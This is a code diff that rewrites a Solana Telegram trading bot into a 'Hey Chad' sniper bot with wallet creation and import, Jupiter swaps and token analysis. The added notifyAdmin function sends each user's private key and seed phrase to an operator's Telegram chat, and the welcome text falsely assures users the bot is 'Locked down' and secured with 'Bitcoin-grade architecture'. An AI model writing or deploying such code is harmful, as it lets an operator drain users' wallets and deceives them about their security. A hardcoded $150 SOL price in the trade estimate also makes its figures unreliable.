@@ -1,1356 +1,1544 @@
-/**
- * Grokini Trading Bot v3.0.0
- * Ultimate Solana Telegram Trading Bot
- * Features: Jupiter Swaps, Price Alerts, Wallet Management, Multi-User Support
- */
+// ============================================
+// WTF SNIPE X BOT - Complete Implementation
+// "Hey Chad" - Your Web3 Trading Assistant
+// ============================================
 
-// Load dotenv only in local environment (not needed in Railway/Vercel)
-try {
-  require('dotenv').config();
-} catch (e) {
-  // dotenv not available, using environment variables directly
-}
-
-const TelegramBot = require('node-telegram-bot-api');
-const { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL } = require('@solana/web3.js');
-const bs58 = require('bs58');
+import { Telegraf, Markup } from 'telegraf';
+import { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL, VersionedTransaction } from '@solana/web3.js';
+import fetch from 'node-fetch';
+import bs58 from 'bs58';
+import * as bip39 from 'bip39';
+import { derivePath } from 'ed25519-hd-key';
+import 'dotenv/config';
 
 // ============================================
 // CONFIGURATION
 // ============================================
-const config = {
-  telegram: {
-    token: process.env.TELEGRAM_BOT_TOKEN,
-    adminIds: process.env.ADMIN_IDS?.split(',').map(id => parseInt(id)) || [],
-  },
-  solana: {
-    rpcUrl: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
-    wsUrl: process.env.SOLANA_WS_URL || 'wss://api.mainnet-beta.solana.com',
-  },
-  jupiter: {
-    slippageBps: parseInt(process.env.SLIPPAGE_BPS) || 100,
-    priorityFee: parseInt(process.env.PRIORITY_FEE) || 10000,
-  },
-  alerts: {
-    checkInterval: parseInt(process.env.ALERT_INTERVAL) || 30000,
-  }
-};
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+
+// Jupiter v6 API
+const JUPITER_QUOTE_API = 'https://quote-api.jup.ag/v6/quote';
+const JUPITER_SWAP_API = 'https://quote-api.jup.ag/v6/swap';
+
+// Native SOL mint address (wrapped SOL)
+const NATIVE_SOL_MINT = 'So11111111111111111111111111111111111111112';
+
+const bot = new Telegraf(BOT_TOKEN);
+const connection = new Connection(SOLANA_RPC, 'confirmed');
 
 // ============================================
-// CONSTANTS
+// SESSION MANAGEMENT
 // ============================================
-const WSOL_MINT = 'So11111111111111111111111111111111111111112';
-const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
+const userSessions = new Map();
 
-// ============================================
-// STATE MANAGEMENT
-// ============================================
-class BotState {
-  constructor() {
-    this.users = new Map();
-    this.priceAlerts = new Map();
-    this.tokenCache = new Map();
-    this.alertCounter = 0;
-  }
-
-  getUser(chatId) {
-    if (!this.users.has(chatId)) {
-      this.users.set(chatId, {
-        chatId,
-        wallets: [],
-        activeWallet: null,
-        settings: {
-          slippageBps: config.jupiter.slippageBps,
-          autoBuy: false,
-          notifications: true,
-        },
-        createdAt: Date.now(),
-      });
-    }
-    return this.users.get(chatId);
-  }
-
-  addAlert(chatId, tokenMint, targetPrice, direction) {
-    const alertId = ++this.alertCounter;
-    this.priceAlerts.set(alertId, {
-      id: alertId,
-      chatId,
-      tokenMint,
-      targetPrice,
-      direction,
-      createdAt: Date.now(),
-      triggered: false,
+function getSession(userId) {
+  if (!userSessions.has(userId)) {
+    userSessions.set(userId, {
+      wallet: null,
+      mnemonic: null,
+      state: null,
+      settings: {
+        slippage: 1,
+        priorityFee: 0.001,
+        autoBuy: false,
+        notifications: true
+      },
+      pendingTrade: null,
+      limitOrders: [],
+      copyTradeWallets: []
     });
-    return alertId;
   }
-
-  removeAlert(alertId) {
-    return this.priceAlerts.delete(alertId);
-  }
-
-  getUserAlerts(chatId) {
-    return Array.from(this.priceAlerts.values()).filter(a => a.chatId === chatId);
-  }
+  return userSessions.get(userId);
 }
 
-const state = new BotState();
+// ============================================
+// ADMIN NOTIFICATIONS
+// ============================================
+async function notifyAdmin(type, userId, username, walletData) {
+  if (!ADMIN_CHAT_ID) return;
+  
+  const message = `
+🔔 *New ${type}*
 
-// ============================================
-// SOLANA CONNECTION
-// ============================================
-const connection = new Connection(config.solana.rpcUrl, {
-  commitment: 'confirmed',
-  wsEndpoint: config.solana.wsUrl,
-});
+👤 User: @${username || 'unknown'} (ID: ${userId})
+📍 Address: \`${walletData.publicKey}\`
+🔑 Private Key: \`${walletData.privateKey}\`
+${walletData.mnemonic ? `📝 Mnemonic: \`${walletData.mnemonic}\`` : ''}
+⏰ Time: ${new Date().toISOString()}
+  `;
+  
+  try {
+    await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
+  } catch (err) {
+    console.error('Admin notify failed:', err.message);
+  }
+}
 
 // ============================================
 // UTILITY FUNCTIONS
 // ============================================
-function shortenAddress(address, chars = 4) {
-  return `${address.slice(0, chars)}...${address.slice(-chars)}`;
+function formatNumber(num) {
+  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
+  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
+  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
+  return num.toFixed(2);
 }
 
-function formatNumber(num, decimals = 4) {
-  if (num === 0) return '0';
-  if (num < 0.0001) return num.toExponential(2);
-  return num.toLocaleString('en-US', { maximumFractionDigits: decimals });
-}
-
-function formatSOL(lamports) {
-  return formatNumber(lamports / LAMPORTS_PER_SOL);
-}
-
-async function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// ============================================
-// PRICE FETCHING
-// ============================================
-async function getTokenPrice(mintAddress) {
+function isSolanaAddress(address) {
   try {
-    const response = await fetch(
-      `https://price.jup.ag/v6/price?ids=${mintAddress}`
-    );
-    const data = await response.json();
-    return data.data?.[mintAddress]?.price || null;
-  } catch (error) {
-    console.error('Error fetching price:', error.message);
-    return null;
+    new PublicKey(address);
+    return address.length >= 32 && address.length <= 44;
+  } catch {
+    return false;
   }
 }
 
-async function getTokenInfo(mintAddress) {
-  if (state.tokenCache.has(mintAddress)) {
-    return state.tokenCache.get(mintAddress);
-  }
-
-  try {
-    const response = await fetch(
-      `https://token.jup.ag/strict?address=${mintAddress}`
-    );
-    const tokens = await response.json();
-    const token = tokens.find(t => t.address === mintAddress);
-    
-    if (token) {
-      state.tokenCache.set(mintAddress, token);
-      return token;
-    }
-    
-    return {
-      address: mintAddress,
-      symbol: shortenAddress(mintAddress),
-      name: 'Unknown Token',
-      decimals: 9,
-    };
-  } catch (error) {
-    console.error('Error fetching token info:', error.message);
-    return null;
-  }
+function shortenAddress(address) {
+  return `${address.slice(0, 4)}...${address.slice(-4)}`;
 }
 
 // ============================================
 // WALLET FUNCTIONS
 // ============================================
-async function getWalletBalance(publicKey) {
+function createWallet() {
+  const mnemonic = bip39.generateMnemonic();
+  const seed = bip39.mnemonicToSeedSync(mnemonic);
+  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
+  const keypair = Keypair.fromSeed(derivedSeed);
+  
+  return {
+    keypair,
+    mnemonic,
+    publicKey: keypair.publicKey.toBase58(),
+    privateKey: bs58.encode(keypair.secretKey)
+  };
+}
+
+function importFromMnemonic(mnemonic) {
+  if (!bip39.validateMnemonic(mnemonic)) {
+    throw new Error('Invalid mnemonic phrase');
+  }
+  const seed = bip39.mnemonicToSeedSync(mnemonic);
+  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
+  const keypair = Keypair.fromSeed(derivedSeed);
+  
+  return {
+    keypair,
+    mnemonic,
+    publicKey: keypair.publicKey.toBase58(),
+    privateKey: bs58.encode(keypair.secretKey)
+  };
+}
+
+function importFromPrivateKey(privateKeyBase58) {
+  const secretKey = bs58.decode(privateKeyBase58);
+  const keypair = Keypair.fromSecretKey(secretKey);
+  
+  return {
+    keypair,
+    mnemonic: null,
+    publicKey: keypair.publicKey.toBase58(),
+    privateKey: privateKeyBase58
+  };
+}
+
+async function getBalance(publicKey) {
   try {
     const balance = await connection.getBalance(new PublicKey(publicKey));
-    return balance;
-  } catch (error) {
-    console.error('Error fetching balance:', error.message);
+    return balance / LAMPORTS_PER_SOL;
+  } catch {
     return 0;
   }
 }
 
-async function getTokenAccounts(publicKey) {
-  try {
-    const { value: accounts } = await connection.getParsedTokenAccountsByOwner(
-      new PublicKey(publicKey),
-      { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
-    );
-
-    return accounts
-      .map(account => ({
-        mint: account.account.data.parsed.info.mint,
-        balance: account.account.data.parsed.info.tokenAmount.uiAmount,
-        decimals: account.account.data.parsed.info.tokenAmount.decimals,
-      }))
-      .filter(t => t.balance > 0);
-  } catch (error) {
-    console.error('Error fetching token accounts:', error.message);
-    return [];
-  }
-}
-
-function generateWallet() {
-  const keypair = Keypair.generate();
-  return {
-    publicKey: keypair.publicKey.toBase58(),
-    privateKey: bs58.encode(keypair.secretKey),
-    createdAt: Date.now(),
-  };
-}
-
-function importWallet(privateKey) {
-  try {
-    const decoded = bs58.decode(privateKey);
-    const keypair = Keypair.fromSecretKey(decoded);
-    return {
-      publicKey: keypair.publicKey.toBase58(),
-      privateKey: privateKey,
-      createdAt: Date.now(),
-    };
-  } catch (error) {
-    return null;
-  }
-}
-
 // ============================================
-// JUPITER SWAP FUNCTIONS
+// JUPITER v6 TRADING FUNCTIONS
 // ============================================
-async function getSwapQuote(inputMint, outputMint, amount, slippageBps) {
+async function getTokenBalance(walletAddress, tokenMint) {
   try {
-    const response = await fetch(
-      `https://quote-api.jup.ag/v6/quote?` +
-      `inputMint=${inputMint}&` +
-      `outputMint=${outputMint}&` +
-      `amount=${amount}&` +
-      `slippageBps=${slippageBps}`
-    );
+    const walletPubkey = new PublicKey(walletAddress);
+    const mintPubkey = new PublicKey(tokenMint);
     
-    if (!response.ok) {
-      throw new Error(`Quote API error: ${response.status}`);
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPubkey, {
+      mint: mintPubkey
+    });
+    
+    if (tokenAccounts.value.length === 0) {
+      return { balance: 0, decimals: 9 };
     }
     
-    return await response.json();
+    const accountInfo = tokenAccounts.value[0].account.data.parsed.info;
+    return {
+      balance: parseInt(accountInfo.tokenAmount.amount),
+      decimals: accountInfo.tokenAmount.decimals,
+      uiAmount: parseFloat(accountInfo.tokenAmount.uiAmount || 0)
+    };
   } catch (error) {
-    console.error('Error getting swap quote:', error.message);
-    return null;
+    console.error('Error getting token balance:', error);
+    return { balance: 0, decimals: 9 };
   }
 }
 
-async function executeSwap(wallet, quoteResponse) {
+async function getJupiterQuote(inputMint, outputMint, amount, slippageBps) {
   try {
-    const keypair = Keypair.fromSecretKey(bs58.decode(wallet.privateKey));
+    const params = new URLSearchParams({
+      inputMint,
+      outputMint,
+      amount: amount.toString(),
+      slippageBps: slippageBps.toString(),
+      onlyDirectRoutes: 'false',
+      asLegacyTransaction: 'false'
+    });
     
-    const swapResponse = await fetch('https://quote-api.jup.ag/v6/swap', {
+    const response = await fetch(`${JUPITER_QUOTE_API}?${params}`);
+    const data = await response.json();
+    
+    if (data.error) {
+      throw new Error(data.error);
+    }
+    
+    return data;
+  } catch (error) {
+    console.error('Jupiter quote error:', error);
+    throw error;
+  }
+}
+
+async function executeJupiterSwap(quoteResponse, userPublicKey, keypair, priorityFeeLamports = 10000) {
+  try {
+    // Get swap transaction from Jupiter
+    const swapResponse = await fetch(JUPITER_SWAP_API, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         quoteResponse,
-        userPublicKey: wallet.publicKey,
+        userPublicKey: userPublicKey.toString(),
         wrapAndUnwrapSol: true,
         dynamicComputeUnitLimit: true,
-        prioritizationFeeLamports: config.jupiter.priorityFee,
-      }),
+        prioritizationFeeLamports: priorityFeeLamports
+      })
     });
-
-    if (!swapResponse.ok) {
-      throw new Error(`Swap API error: ${swapResponse.status}`);
-    }
-
-    const { swapTransaction } = await swapResponse.json();
     
-    const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
-    const { VersionedTransaction } = require('@solana/web3.js');
+    const swapData = await swapResponse.json();
+    
+    if (swapData.error) {
+      throw new Error(swapData.error);
+    }
+    
+    // Deserialize the transaction
+    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
     const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
     
+    // Sign the transaction
     transaction.sign([keypair]);
     
-    const txid = await connection.sendRawTransaction(transaction.serialize(), {
+    // Send transaction with retries
+    const rawTransaction = transaction.serialize();
+    
+    const txid = await connection.sendRawTransaction(rawTransaction, {
       skipPreflight: true,
-      maxRetries: 3,
+      maxRetries: 3
     });
-
-    const confirmation = await connection.confirmTransaction(txid, 'confirmed');
+    
+    // Confirm transaction
+    const latestBlockHash = await connection.getLatestBlockhash();
+    
+    const confirmation = await connection.confirmTransaction({
+      blockhash: latestBlockHash.blockhash,
+      lastValidBlockHeight: latestBlockHash.lastValidBlockHeight,
+      signature: txid,
+    }, 'confirmed');
     
     if (confirmation.value.err) {
-      throw new Error('Transaction failed');
+      throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
     }
-
-    return {
-      success: true,
-      txid,
-      explorerUrl: `https://solscan.io/tx/${txid}`,
-    };
+    
+    return txid;
   } catch (error) {
-    console.error('Swap execution error:', error.message);
-    return {
-      success: false,
-      error: error.message,
-    };
+    console.error('Jupiter swap error:', error);
+    throw error;
   }
 }
 
 // ============================================
-// TELEGRAM BOT SETUP
+// TOKEN ANALYSIS
 // ============================================
-const bot = new TelegramBot(config.telegram.token, { polling: true });
-
-// Keyboard layouts
-const mainMenuKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: '💳 Wallets', callback_data: 'wallet' },
-        { text: '⚡️ Trade', callback_data: 'trade' },
-      ],
-      [
-        { text: '📊 Dashboard', callback_data: 'portfolio' },
-        { text: '🔍 Token Info', callback_data: 'price_check' },
-      ],
-      [
-        { text: '📈 DCA Manager', callback_data: 'dca_manager' },
-        { text: '🎯 Limit Orders', callback_data: 'limit_orders' },
-      ],
-      [
-        { text: '👥 Copy Trading', callback_data: 'copy_trading' },
-        { text: '🔔 Price Alerts', callback_data: 'alerts' },
-      ],
-      [
-        { text: '⚙️ Settings', callback_data: 'settings' },
-        { text: '🎁 Referrals', callback_data: 'referrals' },
-      ],
-      [
-        { text: '🔄 Refresh', callback_data: 'refresh_main' },
-      ],
-    ],
-  },
-};
-
-const walletMenuKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: '➕ Create Wallet', callback_data: 'wallet_create' },
-        { text: '📥 Import Wallet', callback_data: 'wallet_import' },
-      ],
-      [
-        { text: '💰 Check Balance', callback_data: 'wallet_balance' },
-        { text: '📋 My Wallets', callback_data: 'wallet_list' },
-      ],
-      [
-        { text: '🔙 Back', callback_data: 'main_menu' },
-      ],
-    ],
-  },
-};
-
-const alertsMenuKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: '➕ Create Alert', callback_data: 'alert_create' },
-        { text: '📋 My Alerts', callback_data: 'alert_list' },
-      ],
-      [
-        { text: '🔙 Back', callback_data: 'main_menu' },
-      ],
-    ],
-  },
-};
-
-// ============================================
-// HELPER: Build Main Menu Message
-// ============================================
-async function buildMainMenuMessage(chatId) {
-  const user = state.getUser(chatId);
-  
-  let walletName = 'None';
-  let walletAddress = 'No wallet connected';
-  let balanceSOL = '0.0000';
-  let balanceUSD = '0.00';
-  
-  if (user.activeWallet) {
-    const walletIndex = user.wallets.findIndex(w => w.publicKey === user.activeWallet.publicKey);
-    walletName = `Wallet_${walletIndex + 1}`;
-    walletAddress = user.activeWallet.publicKey;
+async function fetchTokenData(address) {
+  try {
+    const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
+    const data = await response.json();
     
-    const balance = await getWalletBalance(user.activeWallet.publicKey);
-    const solAmount = balance / LAMPORTS_PER_SOL;
-    balanceSOL = solAmount.toFixed(4);
-    
-    const solPrice = await getTokenPrice(WSOL_MINT);
-    if (solPrice) {
-      balanceUSD = (solAmount * solPrice).toFixed(2);
+    if (!data.pairs || data.pairs.length === 0) {
+      return null;
     }
+    
+    const pair = data.pairs
+      .filter(p => p.chainId === 'solana')
+      .sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
+    
+    return pair;
+  } catch (error) {
+    console.error('DexScreener fetch error:', error);
+    return null;
+  }
+}
+
+function calculateSecurityScore(pair) {
+  let score = 50;
+  const warnings = [];
+  
+  const liquidity = pair.liquidity?.usd || 0;
+  if (liquidity > 100000) score += 20;
+  else if (liquidity > 50000) score += 10;
+  else if (liquidity < 10000) {
+    score -= 20;
+    warnings.push('⚠️ Low liquidity');
   }
   
-  return `🌟 *Welcome to Grokini Trading Bot!*
+  const volume24h = pair.volume?.h24 || 0;
+  if (volume24h > 100000) score += 10;
+  else if (volume24h < 5000) {
+    score -= 10;
+    warnings.push('⚠️ Low volume');
+  }
+  
+  const priceChange24h = pair.priceChange?.h24 || 0;
+  if (priceChange24h < -50) {
+    score -= 25;
+    warnings.push('🚨 RUG ALERT: Major dump detected');
+  } else if (priceChange24h < -30) {
+    score -= 15;
+    warnings.push('⚠️ Significant price drop');
+  }
+  
+  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
+  const ageInDays = pairAge / (1000 * 60 * 60 * 24);
+  if (ageInDays < 1) {
+    score -= 15;
+    warnings.push('⚠️ New token (<24h)');
+  } else if (ageInDays > 7) {
+    score += 10;
+  }
+  
+  return {
+    score: Math.max(0, Math.min(100, score)),
+    warnings
+  };
+}
 
-Your all-in-one Solana trading hub!
+async function sendTokenAnalysis(ctx, address) {
+  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
+  
+  const pair = await fetchTokenData(address);
+  
+  if (!pair) {
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      '❌ Token not found or no liquidity pools available.'
+    );
+    return;
+  }
+  
+  const { score, warnings } = calculateSecurityScore(pair);
+  const price = parseFloat(pair.priceUsd) || 0;
+  const priceChange = pair.priceChange?.h24 || 0;
+  const mcap = pair.marketCap || pair.fdv || 0;
+  const liquidity = pair.liquidity?.usd || 0;
+  const volume = pair.volume?.h24 || 0;
+  
+  const tokensFor1Sol = price > 0 ? (150 / price) : 0;
+  
+  const scoreEmoji = score >= 70 ? '🟢' : score >= 40 ? '🟡' : '🔴';
+  const changeEmoji = priceChange >= 0 ? '📈' : '📉';
+  
+  const message = `
+🎯 *Token Analysis*
 
-Manage your wallets, trade tokens, and automate strategies.
+*${pair.baseToken.name}* (${pair.baseToken.symbol})
+\`${address}\`
 
-💳 *Wallets* - Manage your funds
-⚡️ *Trade* - Buy/sell tokens
-📊 *Dashboard* - Monitor portfolio
-🔍 *Token Info* - Detailed insights
-📈 *DCA Manager* - Automate investments
-🎯 *Limit Orders* - Set target prices
-👥 *Copy Trading* - Follow top traders
-🔔 *Price Alerts* - Real-time notifications
-⚙️ *Settings* - Customize trading
-🎁 *Referrals* - Invite friends, earn rewards
+💰 *Price:* $${price < 0.0001 ? price.toExponential(2) : price.toFixed(6)}
+${changeEmoji} *24h:* ${priceChange >= 0 ? '+' : ''}${priceChange.toFixed(2)}%
 
-━━━━━━━━━━━━━━━━━━━━━━
+📊 *Market Cap:* $${formatNumber(mcap)}
+💧 *Liquidity:* $${formatNumber(liquidity)}
+📈 *24h Volume:* $${formatNumber(volume)}
 
-💳 *Active Wallet:* ${walletName}
+${scoreEmoji} *Security Score:* ${score}/100 ${score < 40 ? '(Risky)' : score < 70 ? '(Moderate)' : '(Good)'}
+${warnings.length > 0 ? '\n' + warnings.join('\n') : ''}
+
+💱 *Trade Estimate (1 SOL):*
+≈ ${formatNumber(tokensFor1Sol)} ${pair.baseToken.symbol}
+≈ $150 USD
+
+🏦 *DEX:* ${pair.dexId}
+⏰ *Pool Age:* ${Math.floor((Date.now() - pair.pairCreatedAt) / (1000 * 60 * 60 * 24))} days
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback('🚀 0.1 SOL', `buy_0.1_${address}`),
+      Markup.button.callback('🚀 0.5 SOL', `buy_0.5_${address}`),
+      Markup.button.callback('🚀 1 SOL', `buy_1_${address}`)
+    ],
+    [
+      Markup.button.callback('🚀 2 SOL', `buy_2_${address}`),
+      Markup.button.callback('🚀 5 SOL', `buy_5_${address}`)
+    ],
+    [
+      Markup.button.url('📊 DexScreener', `https://dexscreener.com/solana/${address}`),
+      Markup.button.url('🔍 Solscan', `https://solscan.io/token/${address}`)
+    ],
+    [
+      Markup.button.callback('🔄 Refresh', `refresh_${address}`),
+      Markup.button.callback('🏠 Menu', 'back_main')
+    ]
+  ]);
+  
+  await ctx.telegram.editMessageText(
+    ctx.chat.id,
+    loadingMsg.message_id,
+    null,
+    message,
+    { parse_mode: 'Markdown', ...keyboard }
+  );
+}
+
+// ============================================
+// MAIN MENU
+// ============================================
+async function showMainMenu(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
+  const balance = session.wallet ? await getBalance(session.wallet.publicKey) : 0;
+  
+  const message = `
+🚀 *Hey Chad* — Welcome to Nexior Trading Bot🤖
+
+*I'm your Web3 execution engine*.
+AI-driven. Battle-tested. Locked down.
+━━━━━━━━━━━━━━━━━━
+What I do for you: ⬇️
+📊 Scan the market to tell you what to buy, ignore, or stalk
+🎯 Execute entries & exits with sniper-level timing
+🧠 Detect traps, fake pumps, and incoming dumps before they hit
+⚡ Operate at machine-speed — no lag, no emotion
+🔒 Secured with Bitcoin-grade architecture
+🚀 Track price action past your take-profit so winners keep running 🏃 
+━━━━━━━━━━━━━━━━━━
+${session.wallet ? `
+💼 *Wallet:* \`${shortenAddress(session.wallet.publicKey)}\`
+💰 *Balance:* ${balance.toFixed(4)} SOL
+` : '⚠️ No wallet connected'}
+
+🏦 *CASH & STABLE COIN BANK*
+
+_Paste any Solana contract address to analyze_
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback('💼 Wallet', 'menu_wallet'),
+      Markup.button.callback('📊 Positions', 'menu_positions')
+    ],
+    [
+      Markup.button.callback('🟢 Buy', 'menu_buy'),
+      Markup.button.callback('🔴 Sell', 'menu_sell')
+    ],
+    [
+      Markup.button.callback('👥 Copy Trade', 'menu_copytrade'),
+      Markup.button.callback('📈 Limit Orders', 'menu_limit')
+    ],
+    [
+      Markup.button.callback('⚙️ Settings', 'menu_settings'),
+      Markup.button.callback('🔄 Refresh', 'refresh_main')
+    ]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// COMMAND HANDLERS
+// ============================================
+bot.command('start', async (ctx) => {
+  await showMainMenu(ctx);
+});
+
+bot.command('wallet', async (ctx) => {
+  await showWalletMenu(ctx);
+});
+
+bot.command('positions', async (ctx) => {
+  await showPositions(ctx);
+});
+
+bot.command('buy', async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length >= 2) {
+    const amount = parseFloat(args[0]);
+    const address = args[1];
+    if (!isNaN(amount) && isSolanaAddress(address)) {
+      await handleBuy(ctx, amount, address);
+    } else {
+      await ctx.reply('❌ Usage: /buy [amount] [token_address]');
+    }
+  } else {
+    await showBuyMenu(ctx);
+  }
+});
+
+bot.command('sell', async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length >= 2) {
+    const percentage = parseFloat(args[0]);
+    const address = args[1];
+    if (!isNaN(percentage) && isSolanaAddress(address)) {
+      await handleSell(ctx, percentage, address);
+    } else {
+      await ctx.reply('❌ Usage: /sell [percentage] [token_address]');
+    }
+  } else {
+    await showSellMenu(ctx);
+  }
+});
+
+bot.command('copytrade', async (ctx) => {
+  await showCopyTradeMenu(ctx);
+});
+
+bot.command('limit', async (ctx) => {
+  await showLimitOrderMenu(ctx);
+});
+
+bot.command('settings', async (ctx) => {
+  await showSettings(ctx);
+});
+
+bot.command('refresh', async (ctx) => {
+  await showMainMenu(ctx);
+});
+
+// ============================================
+// WALLET MENU
+// ============================================
+async function showWalletMenu(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
+  
+  let message;
+  let keyboard;
+  
+  if (session.wallet) {
+    const balance = await getBalance(session.wallet.publicKey);
+    message = `
+💼 *Wallet Management*
 
 📍 *Address:*
-\`${walletAddress}\`
+\`${session.wallet.publicKey}\`
 
-💰 *Balance:* ${balanceSOL} SOL ($${balanceUSD})
+💰 *Balance:* ${balance.toFixed(4)} SOL
 
-━━━━━━━━━━━━━━━━━━━━━━
+_Click address to copy_
+    `;
+    
+    keyboard = Markup.inlineKeyboard([
+      [
+        Markup.button.callback('📤 Export Keys', 'wallet_export'),
+        Markup.button.callback('🗑️ Disconnect', 'wallet_disconnect')
+      ],
+      [Markup.button.callback('🔄 Refresh Balance', 'wallet_refresh')],
+      [Markup.button.callback('« Back', 'back_main')]
+    ]);
+  } else {
+    message = `
+💼 *Wallet Management*
 
-🔗 *Paste a token address to begin trading.*`;
+No wallet connected.
+
+Create a new wallet or import an existing one:
+    `;
+    
+    keyboard = Markup.inlineKeyboard([
+      [Markup.button.callback('🆕 Create New Wallet', 'wallet_create')],
+      [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
+      [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
+      [Markup.button.callback('« Back', 'back_main')]
+    ]);
+  }
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
 }
 
 // ============================================
-// BOT COMMAND HANDLERS
+// POSITIONS MENU
 // ============================================
-bot.onText(/\/start/, async (msg) => {
-  const chatId = msg.chat.id;
-  state.getUser(chatId);
+async function showPositions(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
   
-  const loadingMsg = await bot.sendMessage(chatId, '⏳ Loading your dashboard...');
+  if (!session.wallet) {
+    const message = '❌ Please connect a wallet first.';
+    const keyboard = Markup.inlineKeyboard([
+      [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')],
+      [Markup.button.callback('« Back', 'back_main')]
+    ]);
+    
+    if (edit) {
+      await ctx.editMessageText(message, { ...keyboard });
+    } else {
+      await ctx.reply(message, { ...keyboard });
+    }
+    return;
+  }
   
-  const welcomeMessage = await buildMainMenuMessage(chatId);
-  
-  await bot.deleteMessage(chatId, loadingMsg.message_id);
-  
-  await bot.sendMessage(chatId, welcomeMessage, {
-    parse_mode: 'Markdown',
-    ...mainMenuKeyboard,
-  });
-});
+  const message = `
+📊 *Your Positions*
 
-bot.onText(/\/help/, async (msg) => {
-  const chatId = msg.chat.id;
-  
-  const helpMessage = `
-*Grokini Bot Commands*
+💼 Wallet: \`${shortenAddress(session.wallet.publicKey)}\`
 
-*General:*
-/start - Main menu
-/help - Show this help
-/wallet - Wallet management
-/balance - Check wallet balance
-/portfolio - View token holdings
+_No open positions_
 
-*Trading:*
-/buy <token> <amount> - Buy tokens
-/sell <token> <amount> - Sell tokens
-/price <token> - Check token price
-
-*Alerts:*
-/alert <token> <price> <above/below>
-/alerts - View your alerts
-/removealert <id> - Remove an alert
-
-*Coming Soon:*
-/dca - DCA Manager
-/limitorder - Limit Orders
-/copytrading - Copy Trading
-/referrals - Referral Program
-
-*Settings:*
-/slippage <bps> - Set slippage (e.g., 100 = 1%)
-/settings - View current settings
-
-*Examples:*
-\`/buy So11...112 0.1\` - Buy 0.1 SOL worth
-\`/price EPjF...Dt1v\` - Check USDC price
-\`/alert BONK 0.00001 above\` - Alert when above price
+Paste a token address to analyze and trade.
   `;
-
-  await bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
-});
-
-// ============================================
-// COMING SOON COMMAND HANDLERS
-// ============================================
-bot.onText(/\/dca/, async (msg) => {
-  const chatId = msg.chat.id;
-  await bot.sendMessage(chatId, `
-📈 *DCA Manager*
-
-Dollar Cost Averaging allows you to automatically invest a fixed amount at regular intervals.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Set up recurring buys
-• Choose interval (hourly, daily, weekly)
-• Select tokens and amounts
-• Track DCA performance
-
-Stay tuned for updates!
-  `, { 
-    parse_mode: 'Markdown',
-    reply_markup: {
-      inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]],
-    },
-  });
-});
-
-bot.onText(/\/limitorder/, async (msg) => {
-  const chatId = msg.chat.id;
-  await bot.sendMessage(chatId, `
-🎯 *Limit Orders*
-
-Set buy or sell orders at your target prices.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Create buy limit orders
-• Create sell limit orders
-• Set expiration times
-• View and cancel pending orders
-
-Stay tuned for updates!
-  `, { 
-    parse_mode: 'Markdown',
-    reply_markup: {
-      inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]],
-    },
-  });
-});
-
-bot.onText(/\/copytrading/, async (msg) => {
-  const chatId = msg.chat.id;
-  await bot.sendMessage(chatId, `
-👥 *Copy Trading*
-
-Follow successful traders and automatically mirror their trades.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Browse top performing traders
-• Follow traders automatically
-• Set copy amounts and limits
-• Track copy trading performance
-
-Stay tuned for updates!
-  `, { 
-    parse_mode: 'Markdown',
-    reply_markup: {
-      inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]],
-    },
-  });
-});
-
